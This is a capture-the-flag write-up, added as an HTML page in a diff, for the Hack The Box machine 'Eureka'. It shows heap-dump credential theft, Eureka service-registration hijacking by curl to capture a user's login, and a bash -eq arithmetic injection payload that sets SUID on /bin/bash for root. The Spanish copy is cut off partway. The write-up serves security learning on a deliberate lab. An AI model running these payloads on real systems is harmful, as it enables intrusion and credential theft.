@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eureka | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">eureka</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Spring Boot web application exposed through multiple ports. Initial enumeration revealed a Spring Boot actuator endpoint at <code>/actuator/heapdump</code>, which when downloaded and analyzed using Eclipse Memory Analyzer Tool (MAT), disclosed MySQL database credentials in plain text within the heap memory. These credentials provided SSH access as user <code>oscar190</code>. Further enumeration revealed a Netflix Eureka service discovery server on port 8761, protected by basic authentication. By examining the application configuration files, I discovered credentials for the Eureka server. Leveraging a Server-Side Request Forgery (SSRF) vulnerability inherent to Eureka's registration mechanism, I reconfigured the <code>USER-MANAGEMENT-SERVICE</code> to point to my attacking machine. When user <code>miranda-wise</code> logged in through the automated login simulator, her credentials were captured by my malicious endpoint. After pivoting to miranda-wise, privilege escalation was achieved by exploiting a critical vulnerability in shell arithmetic evaluation within a root-owned cron job. The script <code>/opt/log_analyse.sh</code> performed arithmetic comparison using the <code>-eq</code> operator on unsanitized log file content. By crafting a malicious log entry containing command substitution within the arithmetic context, I was able to execute arbitrary commands as root, ultimately setting the SUID bit on <code>/bin/bash</code> to gain a root shell.</p>
+                    <p><strong>Technologies/Exploits:</strong> Spring Boot Actuator heap dump analysis, Netflix Eureka SSRF via service registration manipulation, Shell arithmetic evaluation command injection, Linux SUID privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image5.png" alt="Nmap scan results showing multiple open ports including SSH, HTTP, and various application services" /></p>
+                
+                <p>The scan reveals several interesting services running on different ports. Port 80 is serving an HTTP application, and port 8761 appears to be running something that requires authentication. I add <code>furni.htb</code> to my <code>/etc/hosts</code> file for proper DNS resolution.</p>
+                
+                <h2>Web Enumeration - Port 8761 Protected Service</h2>
+                <p>When attempting to access port 8761, I'm immediately presented with an HTTP Basic Authentication prompt:</p>
+                <p><img src="./media/image7.png" alt="Browser showing HTTP Basic Authentication prompt for port 8761" /></p>
+                
+                <p>I try several default credentials but none of them work. Running <code>whatweb</code> against the main HTTP service provides some useful information:</p>
+                <pre><code class="language-bash">whatweb http://furni.htb</code></pre>
+                
+                <pre><code class="language-plaintext">http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]</code></pre>
+                
+                <p>The server is running nginx 1.18.0 on Ubuntu Linux and appears to be a furniture e-commerce website. I enumerate virtual hosts and directories using gobuster. While virtual host enumeration doesn't yield results, directory enumeration reveals several interesting paths:</p>
+                <p><img src="./media/image1.png" alt="Gobuster directory enumeration results showing various web paths" /></p>
+                
+                <h2>Web Application Testing - Contact Form Analysis</h2>
+                <p>Among the discovered paths, <code>/contact</code> catches my attention. It contains a contact form that, when submitted, displays the message:</p>
+                <blockquote>
+                    <p>Thank you for contacting us!. We will reach you soon.</p>
+                </blockquote>
+                
+                <p>This suggests that the form submissions might be reviewed by someone, possibly triggering stored XSS. I attempt various XSS payloads to steal session tokens, but none of them produce results. The application appears to be sanitizing user input properly.</p>
+                
+                <h2>Spring Boot Discovery - Blog IDOR Vulnerability</h2>
+                <p>While exploring the website, I discover a blog section with numbered posts. Testing for IDOR (Insecure Direct Object Reference) vulnerabilities, I try accessing blog post ID 0, which triggers an interesting error page:</p>
+                <p><img src="./media/image8.png" alt="Spring Boot error page showing Whitelabel Error Page typical of Spring applications" /></p>
+                
+                <p>The error page is characteristic of Spring Boot applications - it's the default "Whitelabel Error Page". This is a significant finding because Spring Boot applications often expose actuator endpoints that can leak sensitive information.</p>
+                
+                <h2>Spring Boot Actuator Enumeration</h2>
+                <p>Knowing that I'm dealing with a Spring Boot application, I run a specialized scan targeting Spring Boot actuator endpoints:</p>
+                <p><img src="./media/image2.png" alt="Spring Boot actuator endpoint scan showing multiple exposed endpoints including heapdump" /></p>
+                
+                <p>The scan reveals multiple exposed actuator endpoints. While examining the <code>/actuator/env</code> endpoint, I notice that most sensitive data is obfuscated. However, one endpoint stands out: <code>/actuator/heapdump</code>. This endpoint dumps the entire Java heap memory, which can contain sensitive information like passwords, tokens, and database credentials in plain text.</p>
+                
+                <h2>Heap Dump Analysis - Credential Discovery</h2>
+                <p>I download the Eclipse Memory Analyzer Tool (MAT) from <a href="https://eclipse.dev/mat/download/">https://eclipse.dev/mat/download/</a> to analyze the heap dump. This tool is specifically designed to parse Java heap dumps and find interesting strings and objects.</p>
+                
+                <p>After downloading the heap dump from <code>/actuator/heapdump</code> and loading it into MAT, I search for database connection strings and credentials. Eventually, I discover a MySQL connection string containing credentials:</p>
+                <p><img src="./media/image3.png" alt="Eclipse MAT showing MySQL connection string with credentials in the heap dump" /></p>
+                
+                <pre><code class="language-plaintext">jdbc:mysql://localhost:3306/Furni_WebApp_DB.{password=0sc@r190_S0l!dP@sswd, user=oscar190}</code></pre>
+                
+                <p>The credentials extracted are:</p>
+                <ul>
+                    <li>Username: <code>oscar190</code></li>
+                    <li>Password: <code>0sc@r190_S0l!dP@sswd</code></li>
+                </ul>
+                
+                <h2>Initial Access - SSH Authentication</h2>
+                <p>Since the nmap scan showed SSH running on port 22, I attempt to authenticate using the discovered credentials:</p>
+                <pre><code class="language-bash">ssh oscar190@10.10.11.66</code></pre>
+                
+                <p>The credentials work successfully, granting me shell access as user <code>oscar190</code>. Looking at the <code>/home</code> directory, I notice there's another user on the system: <code>miranda-wise</code>.</p>
+                
+                <h2>Internal Service Discovery</h2>
+                <p>To enumerate internal services that might not be accessible from outside the machine, I run <code>ss -tuln</code> to list all listening TCP ports:</p>
+                <p><img src="./media/image4.png" alt="Output of ss -tuln showing internal listening ports including 8080, 8081, and 8082" /></p>
+                
+                <p>The output reveals several internal services:</p>
+                <ul>
+                    <li>Port 8080: Appears to be part of the main application</li>
+                    <li>Port 8081: An unknown service with a login page at <code>/login</code></li>
+                    <li>Port 8082: Another application component</li>
+                </ul>
+                
+                <p>Checking the groups for user miranda-wise reveals that she's part of the <code>developers</code> group:</p>
+                <pre><code class="language-bash">id miranda-wise</code></pre>
+                <pre><code class="language-plaintext">uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)</code></pre>
+                
+                <p>This group membership might be significant for accessing certain files or directories later.</p>
+                
+                <h2>Netflix Eureka Server Discovery</h2>
+                <p>While investigating the application files in <code>/var/www/web/Eureka-Server/src/main/resources/application.yaml</code>, I discover credentials for the service running on port 8761:</p>
+                <pre><code class="language-plaintext">Username: EurekaSrvr
+Password: 0scarPWDisTheB3st</code></pre>
+                
+                <p>These credentials grant access to the Eureka Server interface. After some research, I learn that Netflix Eureka is an open-source service discovery platform used primarily for microservice architectures. It allows services to register themselves and discover other services dynamically.</p>
+                
+                <p>Key resources:</p>
+                <ul>
+                    <li><a href="https://github.com/Netflix/eureka">Netflix Eureka GitHub Repository</a></li>
+                    <li><a href="https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka">Hacking Netflix Eureka - Security Analysis</a></li>
+                </ul>
+                
+                <h2>Log Analysis - User Activity Discovery</h2>
+                <p>Searching for files related to the miranda-wise user in <code>/var/www</code>, I find interesting activity in the log file at <code>/var/www/web/user-management-service/log/application.log</code>:</p>
+                <p><img src="./media/image6.png" alt="Application log showing repeated login attempts by miranda-wise user" /></p>
+                
+                <p>The logs show that miranda-wise is repeatedly logging into the service on port 8081 (user-management-service). This appears to be automated behavior, happening at regular intervals. This presents an opportunity for credential interception.</p>
+                
+                <h2>Eureka SSRF Exploitation - Service Registration Hijacking</h2>
+                <p>The key to this attack is understanding how Eureka's service registration works. Services register themselves with Eureka, providing their hostname, IP address, and health check URLs. By examining <code>http://localhost:8761/eureka/apps</code>, I can see an XML document listing all registered applications, including <code>USER-MANAGEMENT-SERVICE</code>.</p>
+                
+                <h3>Attack Preparation</h3>
+                <p>My strategy is to hijack the <code>USER-MANAGEMENT-SERVICE</code> registration and redirect all traffic to my attacking machine. When miranda-wise attempts to log in through the automated login simulator, her credentials will be sent to my server instead of the legitimate service.</p>
+                
+                <p>First, I create a replica of the login page currently served at <code>localhost:8081</code> and save it as <code>index.html</code> on my machine. Then I set up a simple Flask server with three endpoints:</p>
+                <ul>
+                    <li><code>GET /</code> - Serves the login page</li>
+                    <li><code>GET /login</code> - Serves the login page</li>
+                    <li><code>POST /login</code> - Accepts any POST parameters and logs them</li>
+                </ul>
+                
+                <p>I start this Flask server on port 8081, listening on all interfaces (<code>0.0.0.0</code>) so it can receive connections from the target machine.</p>
+                
+                <h3>Service Deregistration</h3>
+                <p>To modify the Eureka service registration, the simplest approach is to delete the existing service and recreate it pointing to my machine. I delete the current <code>USER-MANAGEMENT-SERVICE</code> registration:</p>
+                <pre><code class="language-bash">curl -X DELETE \
+  -u 'EurekaSrvr:0scarPWDisTheB3st' \
+  http://10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081</code></pre>
+                
+                <h3>Malicious Service Registration</h3>
+                <p>Now I register a new service entry with my attacking machine's IP address and hostname, so all requests to <code>USER-MANAGEMENT-SERVICE</code> will be routed to my server:</p>
+                <pre><code class="language-bash">curl -X POST \
+  -u 'EurekaSrvr:0scarPWDisTheB3st' \
+  -H "Content-Type: application/json" \
+  -d '{
+    "instance": {
+      "instanceId": "10.10.16.6:USER-MANAGEMENT-SERVICE:8081",
+      "hostName": "10.10.16.6",
+      "app": "USER-MANAGEMENT-SERVICE",
+      "ipAddr": "10.10.16.6",
+      "status": "UP",
+      "port": { "$": 8081, "@enabled": "true" },
+      "securePort": { "$": 443, "@enabled": "false" },
+      "vipAddress": "USER-MANAGEMENT-SERVICE",
+      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
+      "healthCheckUrl": "http://10.10.16.6:8081/actuator/health",
+      "statusPageUrl": "http://10.10.16.6:8081/actuator/info",
+      "homePageUrl": "http://10.10.16.6:8081/",
+      "dataCenterInfo": {
+        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+        "name": "MyOwn"
+      }
+    }
+  }' \
+  http://10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE</code></pre>
+                
+                <h3>Credential Capture</h3>
+                <p>Shortly after registering my malicious service, I receive a POST request from miranda-wise with her login credentials:</p>
+                <pre><code class="language-plaintext">Received data: {'username': 'miranda.wise@furni.htb', 'password': 'IL!veT0Be&BeT0L0ve', '_csrf': 'Jyp8WCTjkk0PTDemDmuE3btDqn1f_ri3Vod2a4eGB24q5_ubQx9OPBGGoikiLlSUb0aw5N1xhxxnz9qaY-NHWrS0ZVoahMOv'}
+10.10.11.66 - - "POST /login HTTP/1.1" 200 -</code></pre>
+                
+                <p>The captured credentials are:</p>
+                <ul>
+                    <li>Username: <code>miranda-wise</code></li>
+                    <li>Password: <code>IL!veT0Be&BeT0L0ve</code></li>
+                </ul>
+                
+                <h2>Lateral Movement - Miranda-Wise Access</h2>
+                <p>Using the captured credentials, I switch to the miranda-wise user:</p>
+                <pre><code class="language-bash">su miranda-wise</code></pre>
+                
+                <p>Successfully authenticating as miranda-wise, I can now retrieve the user flag. However, the service on port 8081 turns out to be just a mock login interface with no actual functionality beyond authentication.</p>
+                
+                <h2>Privilege Escalation - Process Monitoring</h2>
+                <p>Having exhausted the obvious privilege escalation vectors in miranda-wise's home directory, I decide to monitor running processes to identify automated tasks. I transfer <code>pspy64</code> to the target machine to observe process execution in real-time without requiring root privileges.</p>
+                
+                <p>After running pspy64 for a few minutes, I observe several interesting processes:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=771454 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh</code></pre>
+                
+                <p>This confirms the automated login behavior I observed earlier. More importantly, I notice another recurring process:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=771404 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
+CMD: UID=0 PID=771559 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log</code></pre>
+                
+                <p>The script <code>/opt/log_analyse.sh</code> is being executed periodically by root (UID=0), processing various application log files. This is a potential privilege escalation vector if I can control the content being processed by the script.</p>
+                
+                <h2>Shell Arithmetic Vulnerability Analysis</h2>
+                <p>Checking the permissions on the log directories, I discover that as a member of the <code>developers</code> group, I have write access:</p>
+                <pre><code class="language-bash">ls -la /var/www/web/cloud-gateway/log/</code></pre>
+                <pre><code class="language-plaintext">drwxrwxr-x 3 www-data developers 4096 Oct 15 13:03 .</code></pre>
+                
+                <p>While I cannot directly modify the existing log files due to permission restrictions, I have full control over the directory itself. This means I can delete and recreate files within it.</p>
+                
+                <p>Examining the <code>/opt/log_analyse.sh</code> script, I focus on finding potential command injection opportunities. The script doesn't appear to have obvious command execution vulnerabilities like <code>eval</code> or direct command substitution. However, I notice it uses the <code>-eq</code> operator for arithmetic comparison.</p>
+                
+                <p>After researching shell arithmetic vulnerabilities, I discover an article on Dev.to: <a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">"-eq can be critically vulnerable"</a>. This article explains how arithmetic evaluation in bash can be exploited for command injection.</p>
+                
+                <h3>Understanding the Vulnerable Function</h3>
+                <p>The vulnerable function in <code>log_analyse.sh</code> looks like this:</p>
+                <p><img src="./media/image9.png" alt="Code snippet showing the vulnerable function using grep with regex and arithmetic comparison with -eq operator" /></p>
+                
+                <p>The function processes each line of the log file, using <code>grep</code> with a regular expression to extract values matching the pattern <code>'Status *'</code>. The <code>\K</code> in the regex means it only captures the portion after "Status ". This extracted value is stored in the <code>$code</code> variable and then used in an arithmetic comparison with <code>-eq</code>.</p>
+                
+                <p>The critical vulnerability lies in how bash handles arithmetic evaluation. When bash encounters <code>-eq</code>, it evaluates the expressions on both sides arithmetically. If the expression contains command substitution syntax like <code>$(command)</code>, bash will execute that command during the arithmetic evaluation phase.</p>
+                
+                <h2>Exploitation - Crafting Malicious Log Entry</h2>
+                <p>Since I cannot edit the existing <code>application.log</code> file directly but have full permissions on its parent directory, my approach is to:</p>
+                <ol>
+                    <li>Delete the existing <code>application.log</code></li>
+                    <li>Create a new <code>application.log</code> with malicious content</li>
+                    <li>Wait for the root cron job to execute the script</li>
+                </ol>
+                
+                <p>I craft a malicious log entry that will set the SUID bit on <code>/bin/bash</code>, allowing me to spawn a root shell:</p>
+                <pre><code class="language-bash">cd /var/www/web/cloud-gateway/log/
+rm application.log
+echo "Status: x[$(chmod u+s /bin/bash)]" > application.log</code></pre>
+                
+                <p>The payload <code>Status: x[$(chmod u+s /bin/bash)]</code> works because when the script extracts everything after "Status: " and uses it in an arithmetic comparison, bash will evaluate <code>x[$(chmod u+s /bin/bash)]</code>. The command substitution <code>$(chmod u+s /bin/bash)</code> gets executed as root during this evaluation, setting the SUID bit on bash.</p>
+                
+                <h2>Root Access - SUID Bash Exploitation</h2>
+                <p>After waiting for the cron job to execute, I verify that the SUID bit has been set on <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash</code></pre>
+                
+                <p>The 's' in the permissions confirms that the SUID bit is set. Now I can spawn a root shell using bash's privileged mode:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>I now have root access and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Spring Boot expuesta a través de múltiples puertos. La enumeración inicial reveló un endpoint actuator de Spring Boot en <code>/actuator/heapdump</code>, que al descargarlo y analizarlo usando Eclipse Memory Analyzer Tool (MAT), reveló credenciales de base de datos MySQL en texto plano dentro de la memoria heap. Estas credenciales proporcionaron acceso SSH como usuario <code>oscar190</code>. La enumeración posterior reveló un servidor de descubrimiento de servicios Netflix Eureka en el puerto 8761, protegido por autenticación básica. Al examinar los archivos de configuración de la aplicación, descubrí credenciales para el servidor Eureka. Aprovechando una vulnerabilidad de Server-Side Request Forgery (SSRF) inherente al mecanismo de registro de Eureka, reconfiguré el <code>USER-MANAGEMENT-SERVICE</code> para apuntar a mi máquina atacante. Cuando la usuaria <code>miranda-wise</code> inició sesión a través del simulador de login automatizado, sus credenciales fueron capturadas por mi endpoint malicioso. Tras pivotar a miranda-wise, conseguí la escalada de privilegios explotando una vulnerabilidad crítica en la evaluación aritmética de shell dentro de un cron job propiedad de root. El script <code>/opt/log_analyse.sh</code> realizaba comparaciones aritméticas usando el operador <code>-eq</code> sobre contenido de archivos de log no sanitizado. Al crear una entrada de log maliciosa conteniendo sustitución de comandos dentro del contexto aritmético, pude ejecutar comandos arbitrarios como root, finalmente estableciendo el bit SUID en <code>/bin/bash</code> para obtener una shell de root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Análisis de heap dump de Spring Boot Actuator, SSRF en Netflix Eureka mediante manipulación de registro de servicios, inyección de comandos en evaluación aritmética de Shell, escalada de privilegios en Linux mediante SUID.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en la máquina objetivo:</p>
+                <p><img src="./media/image5.png" alt="Resultados del escaneo de nmap mostrando múltiples puertos abiertos incluyendo SSH, HTTP y varios servicios de aplicación" /></p>
+                
+                <p>El escaneo revela varios servicios interesantes ejecutándose en diferentes puertos. El puerto 80 sirve una aplicación HTTP, y el puerto 8761 parece estar ejecutando algo que requiere autenticación. Añado <code>furni.htb</code> a mi archivo <code>/etc/hosts</code> para una correcta resolución DNS.</p>
+                
+                <h2>Enumeración Web - Servicio Protegido Puerto 8761</h2>
+                <p>Al intentar acceder al puerto 8761, inmediatamente me encuentro con una petición de autenticación básica HTTP:</p>
+                <p><img src="./media/image7.png" alt="Navegador mostrando petición de autenticación básica HTTP para el puerto 8761" /></p>
+                
+                <p>Pruebo varios credenciales por defecto pero ninguno funciona. Ejecutando <code>whatweb</code> contra el servicio HTTP principal proporciona información útil:</p>
+                <pre><code class="language-bash">whatweb http://furni.htb</code></pre>
+                
+                <pre><code class="language-plaintext">http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]</code></pre>
+                
+                <p>El servidor ejecuta nginx 1.18.0 en Ubuntu Linux y parece ser un sitio web de comercio electrónico de muebles. Enumero hosts virtuales y directorios usando gobuster. Aunque la enumeración de hosts virtuales no produce resultados, la enumeración de directorios revela varias rutas interesantes:</p>
+                <p><img src="./media/image1.png" alt="Resultados de enumeración de directorios de Gobuster mostrando varias rutas web" /></p>
+                
+                <h2>Pruebas de Aplicación Web - Análisis del Formulario de Contacto</h2>
+                <p>Entre las rutas descubiertas, <code>/contact</code> llama mi atención. Contiene un formulario de contacto que, cuando se envía, muestra el mensaje:</p>
+                <blockquote>
+                    <p>Thank you for contacting us!. We will reach you soon.</p>
+                </blockquote>
+                
+                <p>Esto sugiere que los envíos del formulario podrían ser revisados por alguien, posiblemente desencadenando XSS almacenado. Intento varios payloads XSS para robar tokens de sesión, pero ninguno produce resultados. La aplicación parece estar sanitizando correctamente la entrada del usuario.</p>
+                
+                <h2>Descubrimiento de Spring Boot - Vulnerabilidad IDOR en Blog</h2>
+                <p>Mientras exploro el sitio web, descubro una sección de blog con posts numerados. Probando vulnerabilidades IDOR (Insecure Direct Object Reference), intento acceder al post de blog con ID 0, lo cual desencadena una página de error interesante:</p>
+                <p><img src="./media/image8.png" alt="Página de error de Spring Boot mostrando Whitelabel Error Page típica de aplicaciones Spring" /></p>
+                
+                <p>La página de error es característica de aplicaciones Spring Boot - es la "Whitelabel Error Page" por defecto. Este es un hallazgo significativo porque las aplicaciones Spring Boot a menudo exponen endpoints actuator que pueden filtrar información sensible.</p>
+                
+                <h2>Enumeración de Actuator de Spring Boot</h2>
+                <p>Sabiendo que estoy tratando con una aplicación Spring Boot, ejecuto un escaneo especializado dirigido a endpoints actuator de Spring Boot:</p>
+                <p><img src="./media/image2.png" alt="Escaneo de endpoints actuator de Spring Boot mostrando múltiples endpoints expuestos incluyendo heapdump" /></p>
+                
+                <p>El escaneo revela múltiples endpoints actuator expuestos. Mientras examino el endpoint <code>/actuator/env</code>, noto que la mayoría de los datos sensibles están ofuscados. Sin embargo, un endpoint destaca: <code>/actuator/heapdump</code>. Este endpoint vuelca toda la memoria heap de Java, que puede contener información sensible como contraseñas, tokens y credenciales de base de datos en texto plano.</p>
+                
+                <h2>Análisis de Heap Dump - Descubrimiento de Credenciales</h2>
+                <p>Descargo la herramienta Eclipse Memory Analyzer Tool (MAT) desde <a href="https://eclipse.dev/mat/download/">https://eclipse.dev/mat/download/</a> para analizar el heap dump. Esta herramienta está específicamente diseñada para analizar volcados de heap de Java y encontrar cadenas y objetos interesantes.</p>
+                
+                <p>Tras descargar el heap dump desde <code>/actuator/heapdump</code> y cargarlo en MAT, busco cadenas de conexión a base de datos y credenciales. Eventualmente, descubro una cadena de conexión MySQL conteniendo credenciales:</p>
+                <p><img src="./media/image3.png" alt="Eclipse MAT mostrando cadena de conexión MySQL con credenciales en el heap dump" /></p>
+                
+                <pre><code class="language-plaintext">jdbc:mysql://localhost:3306/Furni_WebApp_DB.{password=0sc@r190_S0l!dP@sswd, user=oscar190}</code></pre>
+                
+                <p>Las credenciales extraídas son:</p>
+                <ul>
+                    <li>Usuario: <code>oscar190</code></li>
+                    <li>Contraseña: <code>0sc@r190_S0l!dP@sswd</code></li>
+                </ul>
+                
+                <h2>Acceso Inicial - Autenticación SSH</h2>
+                <p>Ya que el escaneo de nmap mostró SSH ejecutándose en el puerto 22, intento autenticarme usando las credenciales descubiertas:</p>
+                <pre><code class="language-bash">ssh oscar190@10.10.11.66</code></pre>
+                
+                <p>Las credenciales funcionan exitosamente, otorgándome acceso shell como usuario <code>oscar190</code>. Mirando el directorio <code>/home</code>, noto que hay otro usuario en el sistema: <code>miranda-wise</code>.</p>
+                
+                <h2>Descubrimiento de Servicios Internos</h2>
+                <p>Para enumerar servicios internos que podrían no ser accesibles desde fuera de la máquina, ejecuto <code>ss -tuln</code> para listar todos los puertos TCP en escucha:</p>
+                <p><img src="./media/image4.png" alt="Salida de ss -tuln mostrando puertos internos en escucha incluyendo 8080, 8081 y 8082" /></p>
+                
+                <p>La salida revela varios servicios internos:</p>
+                <ul>
+                    <li>Puerto 8080: Parece ser parte de la aplicación principal</li>
+                    <li>Puerto 8081: Un servicio desconocido con una página de login en <code>/login</code></li>
+                    <li>Puerto 8082: Otro componente de la aplicación</li>
+                </ul>
+                
+                <p>Comprobando los grupos del usuario miranda-wise revela que está en el grupo <code>developers</code>:</p>
+                <pre><code class="language-bash">id miranda-wise</code></pre>
+                <pre><code class="language-plaintext">uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)</code></pre>
+                
+                <p>Esta pertenencia a grupo podría ser significativa para acceder a ciertos archivos o directorios más adelante.</p>
+                
+                <h2>Descubrimiento del Servidor Netflix Eureka</h2>
+                <p>Mientras investigo los archivos de la aplicación en <code>/var/www/web/Eureka-Server/src/main/resources/application.yaml</code>, descubro credenciales para el servicio ejecutándose en el puerto 8761:</p>
+                <pre><code class="language-plaintext">Usuario: EurekaSrvr
+Contraseña: 0scarPWDisTheB3st</code></pre>
+                
+                <p>Estas credenciales otorgan acceso a la interfaz del Servidor Eureka. Tras algo de investigación, aprendo que Netflix Eureka es una plataforma de descubrimiento de servicios de código abierto usada principalmente para arquitecturas de microservicios. Permite que los servicios se registren a sí mismos y descubran otros servicios dinámicamente.</p>
+                
+                <p>Recursos clave:</p>
+                <ul>
+                    <li><a href="https://github.com/Netflix/eureka">Repositorio GitHub de Netflix Eureka</a></li>
+                    <li><a href="https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka">Hacking Netflix Eureka - Análisis de Seguridad</a></li>
+                </ul>
+                
+                <h2>Análisis de Logs - Descubrimiento de Actividad de Usuario</h2>
+                <p>Buscando archivos relacionados con la usuaria miranda-wise en <code>/var/www</code>, encuentro actividad interesante en el archivo de log en <code>/var/www/web/user-management-service/log/application.log</code>:</p>
+                <p><img src="./media/image6.png" alt="Log de aplicación mostrando intentos repetidos de login del usuario miranda-wise" /></p>
+                
+                <p>Los logs muestran que miranda-wise está iniciando sesión repetidamente en el servicio del puerto 8081 (user-management-service). Esto parece ser comportamiento automatizado, ocurriendo a intervalos regulares. Esto presenta una oportunidad para interceptar credenciales.</p>
+                
+                <h2>Explotación SSRF de Eureka - Secuestro de Registro de Servicios</h2>
+                <p>La clave de este ataque es entender cómo funciona el registro de servicios de Eureka. Los servicios se registran a sí mismos con Eureka, proporcionando su hostname, dirección IP y URLs de health check. Al examinar <code>http://localhost:8761/eureka/apps</code>, puedo ver un documento XML listando todas las aplicaciones registradas, incluyendo <code>USER-MANAGEMENT-SERVICE</code>.</p>
+                
+                <h3>Preparación del Ataque</h3>
+                <p>Mi estrategia es secuestrar el registro de <code>USER-MANAGEMENT-SERVICE</code> y redirigir todo el tráfico a mi máquina atacante. Cuando miranda-wise intente iniciar sesión a través del simulador de login automatizado, sus credenciales serán enviadas a mi servidor en lugar del servicio legítimo.</p>
+                
+                <p>Primero, creo una réplica de la página de login actualmente servida en <code>localhost:8081</code> y la guardo como <code>index.html</code> en mi máquina. Luego configuro un servidor simple de Flask con tres endpoints:</p>
+                <ul>
+                    <li><code>GET /</code> - Sirve la página de login</li>
+                    <li><code>GET /login</code> - Sirve la página de login</li>
+                    <li><code>POST /login</code> - Acepta cualquier parámetro POST y los registra</li>
+                </ul>
+                
+                <p>Arranco este servidor Flask en el puerto 8081, escuchando en todas las interfaces (<code>0.0.0.0</code>) para que pueda recibir conexiones desde la máquina objetivo.</p>
+                
+                <h3>Desregistro del Servicio</h3>
+                <p>Para modificar el registro del servicio Eureka, el enfoque más simple es eliminar el servicio existente y recrearlo apuntando a mi máquina. Elimino el registro actual de <code>USER-MANAGEMENT-SERVICE</code>:</p>
+                <pre><code class="language-bash">curl -X DELETE \
+  -u 'EurekaSrvr:0scarPWDisTheB3st' \
+  http://10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081</code></pre>
+                
+                <h3>Registro de Servicio Malicioso</h3>
+                <p>Ahora registro una nueva entrada de servicio con la dirección IP y hostname de mi máquina atacante, así todas las peticiones a <code>USER-MANAGEMENT-SERVICE</code> serán enrutadas a mi servidor:</p>
+                <pre><code class="language-bash">curl -X POST \
+  -u 'EurekaSrvr:0scarPWDisTheB3st' \
+  -H "Content-Type: application/json" \
+  -d '{
+    "instance": {
+      "instanceId": "10.10.16.6:USER-MANAGEMENT-SERVICE:8081",
+      "hostName": "10.10.16.6",
+      "app": "USER-MANAGEMENT-SERVICE",
+      "ipAddr": "10.10.16.6",
+      "status": "UP",
+      "port": { "$": 8081, "@enabled": "true" },
+      "securePort": { "$": 443, "@enabled": "false" },
+      "vipAddress": "USER-MANAGEMENT-SERVICE",
+      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
+      "healthCheckUrl": "http://10.10.16.6:8081/actuator/health",
+      "statusPageUrl": "http://10.10.16.6:8081/actuator/info",
+      "homePageUrl": "http://10.10.16.6:8081/",
+      "dataCenterInfo": {
+        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+        "name": "MyOwn"
+      }
+    }
+  }' \
+  http://10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE</code></pre>
+                
+                <h3>Captura de Credenciales</h3>
